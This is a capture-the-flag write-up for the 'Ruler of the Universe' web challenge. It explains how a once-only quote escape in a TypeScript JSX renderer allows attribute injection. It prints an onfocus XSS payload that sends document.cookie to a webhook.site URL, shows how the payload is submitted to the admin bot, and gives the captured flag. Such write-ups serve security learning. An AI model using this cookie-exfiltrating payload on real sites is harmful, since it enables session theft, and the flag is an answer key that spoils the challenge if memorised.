# Ruler of the Universe

## Challenge Summary

- **Category**: Web
- **Points**: 50
- **Solves**: 196 teams

---

### Problem Description

> With this ship I have the entire universe at my fingertips.

---

## Challenge Structure

- The challenge consists of a Bun-based TypeScript web server and an Admin Bot.
- The route `/module/:id?message=` takes a query parameter `message` and renders it inside an `<input>` element using JSX.
- The server escapes double quotes using `.replace('"', '&quot;')`, but only once. This allows attribute injection via crafted input.
- The Admin Bot loads user-submitted URLs and sets a cookie named `flag` before visiting the page. This cookie is accessible from JavaScript.

---

## Exploitation Flow

### Step 1: Bypass Escaping

In the JSX rendering logic:

```ts
.map(([key, value]) => {
  return `${key}="${String(value).replace('"', '&quot;')}"`
})
```

- Only the first double quote is escaped.
- This makes it possible to break out of the attribute context and inject additional attributes or event handlers.

---

### Step 2: XSS Payload

```html
"" autofocus onfocus="fetch('https://webhook.site/...?'+document.cookie);
```

- This payload uses `onfocus` to exfiltrate `document.cookie` to an external server.

---

### Step 3: Rendered HTML

```html
<input
  id="message"
  name="message"
  type="text"
  class="..."
  placeholder="Update your message: &quot;"
  autofocus=""
  onfocus="fetch('https://webhook.site/...?'+document.cookie);"
/>
```

- The payload is reflected into the HTML and triggers when the input gains focus.

---

### Step 4: Admin Bot Behavior

In the Admin Bot code:

```ts
await browser.setCookie({
  name: "flag",
  value: FLAG,
  domain: new URL(mainUrl).hostname,
  httpOnly: false,
  secure: true,
});
```

- The bot sets a `flag` cookie before visiting the submitted URL.
- Since `HttpOnly` is false, the flag is accessible via `document.cookie`.

---

### Step 5: Submitting the Payload

The attacker must submit the payload to the Admin Bot to retrieve the flag from its cookie.

```python
requests.post(admin_bot_url, json={
  "url_part": "module/0?message=..."
})
```

- When the bot loads the crafted URL, the XSS executes and sends the flag to the attacker's webhook.

---

## Flag

- Captured via webhook:

```
https://webhook.site/... ?flag=uiuctf{maybe_i_should_just_use_react_c49b79}
```
